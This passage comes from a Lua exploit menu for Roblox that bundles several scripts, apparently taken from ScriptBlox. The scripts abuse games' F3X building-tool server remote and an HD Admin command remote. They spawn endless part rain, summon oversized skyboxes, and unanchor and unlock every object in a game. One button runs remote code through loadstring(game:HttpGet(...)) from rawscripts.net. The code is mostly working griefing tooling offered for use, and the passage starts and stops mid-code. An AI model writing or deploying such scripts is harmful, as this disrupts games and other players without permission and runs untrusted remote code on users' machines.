			function CreateSpotlight(part)
				local args = {
					[1] = "CreateLights",
					[2] = {
						[1] = {
							["Part"] = part,
							["LightType"] = "SpotLight"
						}
					}
				}
				_(args)
			end
			function SyncLighting(part,brightness)
				local args = {
					[1] = "SyncLighting",
					[2] = {
						[1] = {
							["Part"] = part,
							["LightType"] = "SpotLight",
							["Brightness"] = brightness
						}
					}
				}
				_(args)
			end
		
			function Unanchor()
				for i,v in game.Workspace:GetDescendants() do
					spawn(function()
						SetLocked(v,false)
						SetAnchor(false,v)
					end)
				end
			end
			Unanchor()
			
			
			
		
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
		end)
		
	end;
	task.spawn(C_3d);
	-- StarterGui.page2 .Frame.ScrollingFrame.TextButton.LocalScript
	local function C_3f()
	local script = G2L["3f"];
		script.Parent.MouseButton1Click:Connect(function()
			
			
			
			loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-roadblocks-F3X-things-112624"))()
			
			
			
			
		
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
		end)
		
	end;
	task.spawn(C_3f);
	-- StarterGui.page2 .Frame.page frames.page2.LocalScript
	local function C_44()
	local script = G2L["44"];
		script.Parent.MouseButton1Click:Connect(function()
			
			
			
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		--[=[
		 d888b  db    db d888888b      .d888b.      db      db    db  .d8b.  
		88' Y8b 88    88   `88'        VP  `8D      88      88    88 d8' `8b 
		88      88    88    88            odD'      88      88    88 88ooo88 
		88  ooo 88    88    88          .88'        88      88    88 88~~~88 
		88. ~8~ 88b  d88   .88.        j88.         88booo. 88b  d88 88   88    @uniquadev
		 Y888P  ~Y8888P' Y888888P      888888D      Y88888P ~Y8888P' YP   YP  CONVERTER 
		]=]
		
			-- Instances: 9 | Scripts: 4 | Modules: 0 | Tags: 0
			local G2L = {};
		
			-- StarterGui.page 2
			G2L["1"] = Instance.new("ScreenGui", game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui"));
			G2L["1"]["Name"] = [[page 2]];
			G2L["1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;
		
		
			-- StarterGui.page 2.Frame
			G2L["2"] = Instance.new("Frame", G2L["1"]);
			G2L["2"]["BorderSizePixel"] = 4;
			G2L["2"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
			G2L["2"]["Size"] = UDim2.new(0, 313, 0, 242);
			G2L["2"]["Position"] = UDim2.new(0.38543, 0, 0.12229, 0);
			G2L["2"]["BorderColor3"] = Color3.fromRGB(255, 153, 36);
		
		
			-- StarterGui.page 2.Frame.TextButton
			G2L["3"] = Instance.new("TextButton", G2L["2"]);
			G2L["3"]["TextWrapped"] = true;
			G2L["3"]["BorderSizePixel"] = 3;
			G2L["3"]["TextSize"] = 14;
			G2L["3"]["TextScaled"] = true;
			G2L["3"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
			G2L["3"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
			G2L["3"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
			G2L["3"]["Size"] = UDim2.new(0, 313, 0, 38);
			G2L["3"]["BorderColor3"] = Color3.fromRGB(255, 153, 36);
			G2L["3"]["Text"] = [[RC7 RAIN]];
			G2L["3"]["Position"] = UDim2.new(0, 0, 0.19835, 0);
		
		
			-- StarterGui.page 2.Frame.TextButton.LocalScript
			G2L["4"] = Instance.new("LocalScript", G2L["3"]);
		
		
		
			-- StarterGui.page 2.Frame.TextButton
			G2L["5"] = Instance.new("TextButton", G2L["2"]);
			G2L["5"]["TextWrapped"] = true;
			G2L["5"]["BorderSizePixel"] = 3;
			G2L["5"]["TextSize"] = 14;
			G2L["5"]["TextScaled"] = true;
			G2L["5"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
			G2L["5"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
			G2L["5"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
			G2L["5"]["Size"] = UDim2.new(0, 313, 0, 35);
			G2L["5"]["BorderColor3"] = Color3.fromRGB(255, 153, 36);
			G2L["5"]["Text"] = [[Doggo Army F3X]];
			G2L["5"]["Position"] = UDim2.new(0, 0, 0.4258, 0);
		
		
			-- StarterGui.page 2.Frame.TextButton.LocalScript
			G2L["6"] = Instance.new("LocalScript", G2L["5"]);
		
		
		
			-- StarterGui.page 2.Frame.TextButton
			G2L["7"] = Instance.new("TextButton", G2L["2"]);
			G2L["7"]["TextWrapped"] = true;
			G2L["7"]["BorderSizePixel"] = 3;
			G2L["7"]["TextSize"] = 14;
			G2L["7"]["TextScaled"] = true;
			G2L["7"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
			G2L["7"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
			G2L["7"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
			G2L["7"]["Size"] = UDim2.new(0, 313, 0, 35);
			G2L["7"]["BorderColor3"] = Color3.fromRGB(255, 153, 36);
			G2L["7"]["Text"] = [[Skeleton Skybox]];
			G2L["7"]["Position"] = UDim2.new(0, 0, 0.61379, 0);
		
		
			-- StarterGui.page 2.Frame.TextButton.LocalScript
			G2L["8"] = Instance.new("LocalScript", G2L["7"]);
		
		
		
			-- StarterGui.page 2.Frame.LocalScript
			G2L["9"] = Instance.new("LocalScript", G2L["2"]);
		
		
		
			-- StarterGui.page 2.Frame.TextButton.LocalScript
			local function C_4()
				local script = G2L["4"];
				script.Parent.MouseButton1Click:Connect(function()
		
			--[[
				WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
			]]
					--// Script: RC7 Cloud F3X \\ --
					--// Creator: ItsKittyyyGD \\ --
					-- CODE/SOURCE (OPEN):
		
					local player = game.Players.LocalPlayer
					local char = player.Character or player.CharacterAdded:Wait()
					local tool
		
					for _, v in player:GetDescendants() do
						if v.Name == "SyncAPI" then
							tool = v.Parent
						end
					end
		
					for _, v in game.ReplicatedStorage:GetDescendants() do
						if v.Name == "SyncAPI" then
							tool = v.Parent
						end
					end
		
					local remote = tool.SyncAPI.ServerEndpoint
		
					function _(args)
						remote:InvokeServer(unpack(args))
					end
		
					function SetCollision(part, boolean)
						local args = {"SyncCollision", {{Part = part, CanCollide = boolean}}}
						_(args)
					end
		
					function SetAnchor(boolean, part)
						local args = {"SyncAnchor", {{Part = part, Anchored = boolean}}}
						_(args)
					end
		
					function CreatePart(cf, parent)
						local args = {"CreatePart", "Normal", cf, parent}
						_(args)
					end
		
					function AddMesh(part)
						local args = {"CreateMeshes", {{Part = part}}}
						_(args)
					end
		
					function SetMesh(part, meshid)
						local args = {"SyncMesh", {{Part = part, MeshId = "rbxassetid://" .. meshid}}}
						_(args)
					end
		
					function MeshResize(part, size)
						local args = {"SyncMesh", {{Part = part, Scale = size}}}
						_(args)
					end
		
					function SetColor(part, color)
						local args = {"SyncColor", {{Part = part, Color = color, UnionColoring = false}}}
						_(args)
					end
		
					function MovePart(part, cf)
						local args = {"SyncMove", {{Part = part, CFrame = cf}}}
						_(args)
					end
		
					function CreateCloud()
						local head = char:WaitForChild("Head")
						local cf = head.CFrame + Vector3.new(0, 30, 0)
						CreatePart(cf, workspace)
						task.spawn(function()
							repeat task.wait() until (function()
								for _, v in workspace:GetDescendants() do
									if v:IsA("BasePart") and (v.Position - cf.Position).Magnitude < 0.5 then
										SetAnchor(true, v)
										SetCollision(v, false)
										SetColor(v, BrickColor.new(333).Color)
										AddMesh(v)
										SetMesh(v, "111820358")
										MeshResize(v, Vector3.new(10, 10, 10))
										task.spawn(function()
											game:GetService("RunService").RenderStepped:Connect(function()
												if char and char:FindFirstChild("Head") then
													MovePart(v, char.Head.CFrame + Vector3.new(0, 10, 0))
												end
											end)
										end)
										return true
									end
								end
							end)()
						end)
					end
		
					CreateCloud()
		
					-- i can quit because theres more scripters f3x better than me. This can be my last script but,¿who knows?
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
					local player = game.Players.LocalPlayer
					local char = player.Character
					local tool
					for i,v in player:GetDescendants() do
						if v.Name == "SyncAPI" then
							tool = v.Parent
						end
					end
					for i,v in game.ReplicatedStorage:GetDescendants() do
						if v.Name == "SyncAPI" then
							tool = v.Parent
						end
					end
					remote = tool.SyncAPI.ServerEndpoint
					function _(args)
						remote:InvokeServer(unpack(args))
					end
					function SetCollision(part,boolean)
						local args = {
							[1] = "SyncCollision",
							[2] = {
								[1] = {
									["Part"] = part,
									["CanCollide"] = boolean
								}
							}
						}
						_(args)
					end
					function SetAnchor(boolean,part)
						local args = {
							[1] = "SyncAnchor",
							[2] = {
								[1] = {
									["Part"] = part,
									["Anchored"] = boolean
								}
							}
						}
						_(args)
					end
					function CreatePart(cf,parent)
						local args = {
							[1] = "CreatePart",
							[2] = "Normal",
							[3] = cf,
							[4] = parent
						}
						_(args)
					end
					function DestroyPart(part)
						local args = {
							[1] = "Remove",
							[2] = {
								[1] = part
							}
						}
						_(args)
					end
					function MovePart(part,cf)
						local args = {
							[1] = "SyncMove",
							[2] = {
								[1] = {
									["Part"] = part,
									["CFrame"] = cf
								}
							}
						}
						_(args)
					end
					function Resize(part,size,cf)
						local args = {
							[1] = "SyncResize",
							[2] = {
								[1] = {
									["Part"] = part,
									["CFrame"] = cf,
									["Size"] = size
								}
							}
						}
						_(args)
					end
					function AddMesh(part)
						local args = {
							[1] = "CreateMeshes",
							[2] = {
								[1] = {
									["Part"] = part
								}
							}
						}
						_(args)
					end
		
					function SetMesh(part,meshid)
						local args = {
							[1] = "SyncMesh",
							[2] = {
								[1] = {
									["Part"] = part,
									["MeshId"] = "rbxassetid://"..meshid
								}
							}
						}
						_(args)
					end
					function SetTexture(part, texid)
						local args = {
							[1] = "SyncMesh",
							[2] = {
								[1] = {
									["Part"] = part,
									["TextureId"] = "rbxassetid://"..texid
								}
							}
						}
						_(args)
					end
					function SetName(part, stringg)
						local args = {
							[1] = "SetName",
							[2] = {
								[1] = part
							},
							[3] = stringg
						}
		
						_(args)
					end
					function MeshResize(part,size)
						local args = {
							[1] = "SyncMesh",
							[2] = {
								[1] = {
									["Part"] = part,
									["Scale"] = size
								}
							}
						}
						_(args)
					end
					function Weld(part1, part2,lead)
						local args = {
							[1] = "CreateWelds",
							[2] = {
								[1] = part1,
								[2] = part2
							},
							[3] = lead
						}
						_(args)
		
					end
					function SetLocked(part,boolean)
						local args = {
							[1] = "SetLocked",
							[2] = {
								[1] = part
							},
							[3] = boolean
						}
						_(args)
					end
					function SetTrans(part,int)
						local args = {
							[1] = "SyncMaterial",
							[2] = {
								[1] = {
									["Part"] = part,
									["Transparency"] = int
								}
							}
						}
						_(args)
					end
					function CreateSpotlight(part)
						local args = {
							[1] = "CreateLights",
							[2] = {
								[1] = {
									["Part"] = part,
									["LightType"] = "SpotLight"
								}
							}
						}
						_(args)
					end
					function SyncLighting(part,brightness)
						local args = {
							[1] = "SyncLighting",
							[2] = {
								[1] = {
									["Part"] = part,
									["LightType"] = "SpotLight",
									["Brightness"] = brightness
								}
							}
						}
						_(args)
					end
					function Color(part,color)
						local args = {
							[1] = "SyncColor",
							[2] = {
								[1] = {
									["Part"] = part,
									["Color"] = color --[[Color3]],
									["UnionColoring"] = false
								}
							}
						}
						_(args)
					end
					function SpawnDecal(part,side)
						local args = {
							[1] = "CreateTextures",
							[2] = {
								[1] = {
									["Part"] = part,
									["Face"] = side,
									["TextureType"] = "Decal"
								}
							}
						}
		
						_(args)
					end
					function AddDecal(part,asset,side)
						local args = {
							[1] = "SyncTexture",
							[2] = {
								[1] = {
									["Part"] = part,
									["Face"] = side,
									["TextureType"] = "Decal",
									["Texture"] = "rbxassetid://".. asset
								}
							}
						}
						_(args)
					end
					while wait(0.5) do
						spawn(function()
							e = char.HumanoidRootPart.CFrame.x + math.random(-10, 10)
							f = char.HumanoidRootPart.CFrame.y + 10
							g = char.HumanoidRootPart.CFrame.z + math.random(-10, 10)
							CreatePart(CFrame.new(math.floor(e),math.floor(f),math.floor(g)) + Vector3.new(0,6,0),workspace)
							for i,v in game.Workspace:GetDescendants() do
								if v:IsA("BasePart") and v.CFrame.x == math.floor(e) and v.CFrame.z == math.floor(g) then
		
									SetName(v,"particle by expl_0itspooky")--PLEASE DO NOT RENAME ITS MY CREDIT🙏 
		
									--end)
									--spawn(function()
									SpawnDecal(v,Enum.NormalId.Front)
									AddDecal(v,"331959655",Enum.NormalId.Front)
									SpawnDecal(v,Enum.NormalId.Back)
									AddDecal(v,"331959655",Enum.NormalId.Back)
									SetTrans(v,1)
									Resize(v,Vector3.new(5,6,5.1),v.CFrame)
									SetLocked(v,true)
									SetAnchor(false,v)
								end
							end
						end)
					end
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
				end)
		
			end;
			task.spawn(C_4);
			-- StarterGui.page 2.Frame.TextButton.LocalScript
			local function C_6()
				local script = G2L["6"];
				script.Parent.MouseButton1Click:Connect(function()
		
			--[[
				WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
			]]
					--// Doggo Army F3X BY ItsKittyyyGD! \\--
					-- (still some broken dm me at discord to fix some bugs) --
					-- Version: 1.0.0 (beta leaked by ItsKittyyyGD),soon more versions will be private and u need be a important person for me to get it
					-- CODE/SOURCE (OPEN)
		
					local Players = game:GetService("Players")
					local UIS = game:GetService("UserInputService")
					local RunService = game:GetService("RunService")
					local ReplicatedStorage = game:GetService("ReplicatedStorage")
		
					local player = Players.LocalPlayer
					local gui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
					local introFinished = false
		
					function NotificationScript(txt)
						local label = Instance.new("TextLabel", gui)
						label.Size = UDim2.new(0.9, 0, 0, 19)
						label.Position = UDim2.new(0.05, 0, 0.1, 0)
						label.BackgroundTransparency = 1
						label.TextColor3 = Color3.fromRGB(255, 255, 255)
						label.TextSize = 11
						label.Font = Enum.Font.Code
						label.TextXAlignment = Enum.TextXAlignment.Left
		
						task.spawn(function()
							for i = 1, #txt do
								label.Text = string.sub(txt, 1, i)
								task.wait(0.03)
							end
							task.wait(5)
							for i = #txt, 1, -1 do
								label.Text = string.sub(txt, 1, i)
								task.wait(0.02)
							end
							label:Destroy()
							if txt:find("Doggo Army F3X") then
								introFinished = true
							end
						end)
		
						task.spawn(function()
							while label.Parent do
								for h = 0, 1, 0.01 do
									if label.Parent then
										label.TextColor3 = Color3.fromHSV(h, 1, 1)
										task.wait(0.05)
									end
								end
							end
						end)
					end
		
					NotificationScript("Doggo Army F3X By ItsKittyyyGD\nPress [F] to Generate a Doggo\nVersion: 1.0.0 ,(Last version.)")
		
					local char = player.Character or player.CharacterAdded:Wait()
					local tool
					for _, v in player:GetDescendants() do
						if v.Name == "SyncAPI" then tool = v.Parent break end
					end
					if not tool then
						for _, v in ReplicatedStorage:GetDescendants() do
							if v.Name == "SyncAPI" then tool = v.Parent break end
						end
					end
		
					local remote = tool and tool:FindFirstChild("SyncAPI") and tool.SyncAPI.ServerEndpoint
					local dogeCreated = false
					local dogePart
					local followOffset = Vector3.new(0, -2, -4)
					local targetChar = char
		
					function CreateDoge()
						if not remote or dogeCreated then return end
						dogeCreated = true
						local root = char:WaitForChild("HumanoidRootPart")
						local cf = root.CFrame * CFrame.new(followOffset)
						remote:InvokeServer("CreatePart", "Normal", cf, workspace)
		
						repeat
							task.wait(0.1)
							for _, v in workspace:GetChildren() do
								if v:IsA("BasePart") and (v.Position - cf.Position).Magnitude < 5 then
									dogePart = v
									remote:InvokeServer("SyncAnchor", {{Part = v, Anchored = true}})
									remote:InvokeServer("SyncCollision", {{Part = v, CanCollide = false}})
									remote:InvokeServer("CreateMeshes", {{Part = v}})
									task.wait(0.2)
									remote:InvokeServer("SyncMesh", {{Part = v, MeshId = "rbxassetid://257489726", Scale = Vector3.new(1,1,1)}})
									RunService.Heartbeat:Connect(function()
										if targetChar and targetChar:FindFirstChild("HumanoidRootPart") then
											local targetPos = targetChar.HumanoidRootPart.CFrame * CFrame.new(followOffset)
											remote:InvokeServer("SyncMove", {{Part = dogePart, CFrame = targetPos}})
										end
									end)
									return
								end
							end
						until false
					end
		
					UIS.InputBegan:Connect(function(input, gpe)
						if gpe then return end
						if input.KeyCode == Enum.KeyCode.F then
							if not introFinished then return end
							if dogeCreated then
								NotificationScript("In 1.0.0, only 1 doggo can be created because it's a beta.")
							else
								CreateDoge()
							end
						end
					end)
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
				end)
		
			end;
			task.spawn(C_6);
			-- StarterGui.page 2.Frame.TextButton.LocalScript
			local function C_8()
				local script = G2L["8"];
				script.Parent.MouseButton1Click:Connect(function()
			--[[
				WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
			]]
			--[[
			(==================================)
			( --★ Epik Skeleton Skybox F3X By ItsKittyyyGD ★--)
			(|==================================)
			(--★ SCRIPT CHANGELOGS: ★--)                                   )
			(-) Deleted create sky and destroy Now use Set texture. )
			(★) Smooth Skybox Video.                                             )
			(==================================)
			( I love you Blue2Spooky,Thanks for using my things.)
			(==================================)
			]]
					-- SOURCE
		
		
					local player = game.Players.LocalPlayer
					local char = player.Character or player.CharacterAdded:Wait()
					local tool
		
					for i, v in player:GetDescendants() do
						if v.Name == "SyncAPI" then
							tool = v.Parent
						end
					end
		
					for i, v in game.ReplicatedStorage:GetDescendants() do
						if v.Name == "SyncAPI" then
							tool = v.Parent
						end
					end
		
					local remote = tool.SyncAPI.ServerEndpoint
					local RunService = game:GetService("RunService")
		
					function _(args)
						remote:InvokeServer(unpack(args))
					end
		
					function CreatePart(cf, parent)
						local args = {
							[1] = "CreatePart",
							[2] = "Normal",
							[3] = cf,
							[4] = parent
						}
						_(args)
					end
		
					function SetAnchor(part, boolean)
						local args = {
							[1] = "SyncAnchor",
							[2] = {
								[1] = {
									["Part"] = part,
									["Anchored"] = boolean
								}
							}
						}
						_(args)
					end
		
					function AddMesh(part)
						local args = {
							[1] = "CreateMeshes",
							[2] = {
								[1] = {
									["Part"] = part
								}
							}
						}
						_(args)
					end
		
					function SetMesh(part, meshid)
						local args = {
							[1] = "SyncMesh",
							[2] = {
								[1] = {
									["Part"] = part,
									["MeshId"] = "rbxassetid://" .. meshid
								}
							}
						}
						_(args)
					end
		
					function SetTexture(part, texid)
						local args = {
							[1] = "SyncMesh",
							[2] = {
								[1] = {
									["Part"] = part,
									["TextureId"] = texid
								}
							}
						}
						_(args)
					end
		
					function MeshResize(part, size)
						local args = {
							[1] = "SyncMesh",
							[2] = {
								[1] = {
									["Part"] = part,
									["Scale"] = size
								}
							}
						}
						_(args)
					end
		
					function SetTransparency(part, value)
						local args = {
							[1] = "SyncTransparency",
							[2] = {
								[1] = {
									["Part"] = part,
									["Transparency"] = value
								}
							}
						}
						_(args)
					end
		
					function DestroyPart(part)
						local args = {
							[1] = "Remove",
							[2] = {
								[1] = part
							}
						}
						_(args)
					end
		
					local images = {
						"http://www.roblox.com/asset/?id=169585459",
						"http://www.roblox.com/asset/?id=169585475",
						"http://www.roblox.com/asset/?id=169585485",
						"http://www.roblox.com/asset/?id=169585502",
						"http://www.roblox.com/asset/?id=169585515",
						"http://www.roblox.com/asset/?id=169585502",
						"http://www.roblox.com/asset/?id=169585485",
						"http://www.roblox.com/asset/?id=169585475"
					}
		
					local skyPart
					local skyLoop
					local frameTime = 1 / 10
					local lastUpdate = 0
		
					function CreateSky()
						local hrp = char:FindFirstChild("HumanoidRootPart")
						if not hrp then return end
		
						local cf = hrp.CFrame
						CreatePart(CFrame.new(cf.Position + Vector3.new(0, 6, 0)), workspace)
		
						local found = false
						for i = 1, 50 do
							task.wait()
							for _, v in workspace:GetDescendants() do
								if v:IsA("BasePart") and (v.Position - (cf.Position + Vector3.new(0, 6, 0))).Magnitude < 1 then
									skyPart = v
									found = true
									break
								end
							end
							if found then break end
						end
		
						if not skyPart then return end
		
						SetAnchor(skyPart, true)
						AddMesh(skyPart)
						SetMesh(skyPart, "111891702759441")
						MeshResize(skyPart, Vector3.new(8000, 8000, 8000))
						SetTransparency(skyPart, 0)
		
						local index = 1
						skyLoop = RunService.Heartbeat:Connect(function(deltaTime)
							lastUpdate = lastUpdate + deltaTime
							if lastUpdate >= frameTime then
								lastUpdate = 0
								if not skyPart then
									skyLoop:Disconnect()
									return
								end
								SetTexture(skyPart, images[index])
								index = (index % #images) + 1
							end
						end)
					end
		
					function ResetSky()
						if skyLoop then
							skyLoop:Disconnect()
							skyLoop = nil
						end
						if skyPart then
							DestroyPart(skyPart)
							skyPart = nil
						end
						task.spawn(CreateSky)
					end
		
					player.CharacterAdded:Connect(function(newChar)
						char = newChar
						ResetSky()
					end)
		
					if char and char:FindFirstChild("Humanoid") then
						char:WaitForChild("Humanoid").Died:Connect(function()
							ResetSky()
						end)
					end
		
					CreateSky()
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
				end)
		
			end;
			task.spawn(C_8);
			-- StarterGui.page 2.Frame.LocalScript
			local function C_9()
				local script = G2L["9"];
				local UserInputService = game:GetService("UserInputService")
				local runService = (game:GetService("RunService"));
		
				local gui = script.Parent
		
				local dragging
				local dragInput
				local dragStart
				local startPos
		
				function Lerp(a, b, m)
					return a + (b - a) * m
				end;
		
				local lastMousePos
				local lastGoalPos
				local DRAG_SPEED = (8); -- // The speed of the UI darg.
				function Update(dt)
					if not (startPos) then return end;
					if not (dragging) and (lastGoalPos) then
						gui.Position = UDim2.new(startPos.X.Scale, Lerp(gui.Position.X.Offset, lastGoalPos.X.Offset, dt * DRAG_SPEED), startPos.Y.Scale, Lerp(gui.Position.Y.Offset, lastGoalPos.Y.Offset, dt * DRAG_SPEED))
						return 
					end;
		
					local delta = (lastMousePos - UserInputService:GetMouseLocation())
					local xGoal = (startPos.X.Offset - delta.X);
					local yGoal = (startPos.Y.Offset - delta.Y);
					lastGoalPos = UDim2.new(startPos.X.Scale, xGoal, startPos.Y.Scale, yGoal)
					gui.Position = UDim2.new(startPos.X.Scale, Lerp(gui.Position.X.Offset, xGoal, dt * DRAG_SPEED), startPos.Y.Scale, Lerp(gui.Position.Y.Offset, yGoal, dt * DRAG_SPEED))
				end;
		
				gui.InputBegan:Connect(function(input)
					if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
						dragging = true
						dragStart = input.Position
						startPos = gui.Position
						lastMousePos = UserInputService:GetMouseLocation()
		
						input.Changed:Connect(function()
							if input.UserInputState == Enum.UserInputState.End then
								dragging = false
							end
						end)
					end
				end)
		
				gui.InputChanged:Connect(function(input)
					if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
						dragInput = input
					end
				end)
		
				runService.Heartbeat:Connect(Update)
		
			end;
			task.spawn(C_9);
		
			return G2L["1"], require;
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
		end)
		
	end;
	task.spawn(C_44);
	-- StarterGui.page2 .Frame.page frames.pg4.LocalScript
	local function C_46()
	local script = G2L["46"];
		script.Parent.MouseButton1Click:Connect(function()
			
			
			
		--[[
			WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
		]]
			local ReplicatedStorage = game:GetService("ReplicatedStorage")
			local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
		
			RequestCommand:InvokeServer(";unfog")
			RequestCommand:InvokeServer(";fogcolor black")
			RequestCommand:InvokeServer(";time 0")
		
		
			local player = game.Players.LocalPlayer
			local char = player.Character
			local tool
			for i,v in player:GetDescendants() do
				if v.Name == "SyncAPI" then
					tool = v.Parent
				end
			end
			for i,v in game.ReplicatedStorage:GetDescendants() do
				if v.Name == "SyncAPI" then
					tool = v.Parent
				end
			end
		
			remote = tool.SyncAPI.ServerEndpoint
			function _(args)
				remote:InvokeServer(unpack(args))
			end
		
			function SetCollision(part,bool)
				local args = {
					[1] = "SyncCollision",
					[2] = {
						[1] = {
							["Part"] = part,
							["CanCollide"] = bool
						}
					}
				}
				_(args)
			end
		
			function SetAnchor(bool,part)
				local args = {
					[1] = "SyncAnchor",
					[2] = {
						[1] = {
							["Part"] = part,
							["Anchored"] = bool
						}
					}
				}
				_(args)
			end
		
			function CreatePart(cf,parent)
				local args = {
					[1] = "CreatePart",
					[2] = "Normal",
					[3] = cf,
					[4] = parent
				}
				_(args)
			end
		
			function DestroyPart(part)
				local args = {
					[1] = "Remove",
					[2] = {part}
				}
				_(args)
			end
		
			function MovePart(part,cf)
				local args = {
					[1] = "SyncMove",
					[2] = {
						[1] = {
							["Part"] = part,
							["CFrame"] = cf
						}
					}
				}
				_(args)
			end
		
			function Resize(part,size,cf)
				local args = {
					[1] = "SyncResize",
					[2] = {
						[1] = {
							["Part"] = part,
							["CFrame"] = cf,
							["Size"] = size
						}
					}
				}
				_(args)
			end
		
			function AddMesh(part)
				local args = {
					[1] = "CreateMeshes",
					[2] = {
						[1] = {
							["Part"] = part
						}
					}
				}
				_(args)
			end
		
			function SetMesh(part,meshid)
				local args = {
					[1] = "SyncMesh",
					[2] = {
						[1] = {
							["Part"] = part,
							["MeshId"] = "rbxassetid://"..meshid
						}
					}
				}
				_(args)
			end
		
			function SetTexture(part,texid)
				local args = {
					[1] = "SyncMesh",
					[2] = {
						[1] = {
							["Part"] = part,
							["TextureId"] = "rbxassetid://"..texid
						}
					}
				}
				_(args)
			end
		
			function SetVertexColor(part,color)
				local args = {
					[1] = "SyncMesh",
					[2] = {
						[1] = {
							["Part"] = part,
							["VertexColor"] = color
						}
					}
				}
				_(args)
			end
		
			function SetName(part,name)
				local args = {
					[1] = "SetName",
					[2] = {part},
					[3] = name
				}
				_(args)
			end
		
			function MeshResize(part,size)
				local args = {
					[1] = "SyncMesh",
					[2] = {
						[1] = {
							["Part"] = part,
							["Scale"] = size
						}
					}
				}
				_(args)
			end
		
			function SetLocked(part,bool)
				local args = {
					[1] = "SetLocked",
					[2] = {part},
					[3] = bool
				}
				_(args)
			end
		
			function Sky(id)
				local root = char.HumanoidRootPart
				local spawnPos = CFrame.new(
					math.floor(root.Position.X),
					math.floor(root.Position.Y),
					math.floor(root.Position.Z)
				) + Vector3.new(0,6,0)
		
				CreatePart(spawnPos,workspace)
				task.wait(0.2)
		
				local skyPart
				for i,v in workspace:GetDescendants() do
					if v:IsA("BasePart") and (v.Position - spawnPos.Position).Magnitude < 1 then
						skyPart = v
		
						SetName(v,"HDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD")
						AddMesh(v)
						SetMesh(v,"111891702759441")
						SetTexture(v,id)
		
		
						SetVertexColor(v, Vector3.new(3,3,3))
		
						MeshResize(v,Vector3.new(3000,3000,3000))
						SetLocked(v,true)
						SetAnchor(true,v)
						SetCollision(v,false)
						break
					end
				end
		
				if skyPart then
					local t = 0
					local baseSpeed = 123
					local randomness = 123
		
					game:GetService("RunService").Heartbeat:Connect(function(dt)
						t = t + dt
						local rotX = math.sin(t * 1.5) * randomness
						local rotY = t * baseSpeed
						local rotZ = math.cos(t * 2.1) * randomness
						local newCf = spawnPos * CFrame.Angles(
							math.rad(rotX),
							math.rad(rotY),
							math.rad(rotZ)
						)
						MovePart(skyPart,newCf)
					end)
				end
			end
		
			Sky("86469911507918")
		
			
			
			
			
		
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
		end)
		
	end;
	task.spawn(C_46);
	-- StarterGui.page2 .Frame.page frames.pag3.LocalScript
	local function C_48()
	local script = G2L["48"];
		script.Parent.MouseButton1Click:Connect(function()
			
			
			
		--[=[
		 d888b  db    db d888888b      .d888b.      db      db    db  .d8b.  
		88' Y8b 88    88   `88'        VP  `8D      88      88    88 d8' `8b 
		88      88    88    88            odD'      88      88    88 88ooo88 
		88  ooo 88    88    88          .88'        88      88    88 88~~~88 
		88. ~8~ 88b  d88   .88.        j88.         88booo. 88b  d88 88   88    @uniquadev
		 Y888P  ~Y8888P' Y888888P      888888D      Y88888P ~Y8888P' YP   YP  CONVERTER 
		]=]
		
			-- Instances: 13 | Scripts: 6 | Modules: 0 | Tags: 0
			local G2L = {};
		
			-- StarterGui.ScreenGui
			G2L["1"] = Instance.new("ScreenGui", game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui"));
			G2L["1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;
		
		
			-- StarterGui.ScreenGui.Frame
			G2L["2"] = Instance.new("Frame", G2L["1"]);
			G2L["2"]["BorderSizePixel"] = 4;
			G2L["2"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
			G2L["2"]["Size"] = UDim2.new(0, 304, 0, 267);
			G2L["2"]["Position"] = UDim2.new(0.38543, 0, 0.168, 0);
			G2L["2"]["BorderColor3"] = Color3.fromRGB(255, 146, 11);
		
		
			-- StarterGui.ScreenGui.Frame.TextButton
			G2L["3"] = Instance.new("TextButton", G2L["2"]);
			G2L["3"]["TextWrapped"] = true;
			G2L["3"]["BorderSizePixel"] = 3;
			G2L["3"]["TextSize"] = 14;
			G2L["3"]["TextScaled"] = true;
			G2L["3"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
			G2L["3"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
			G2L["3"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
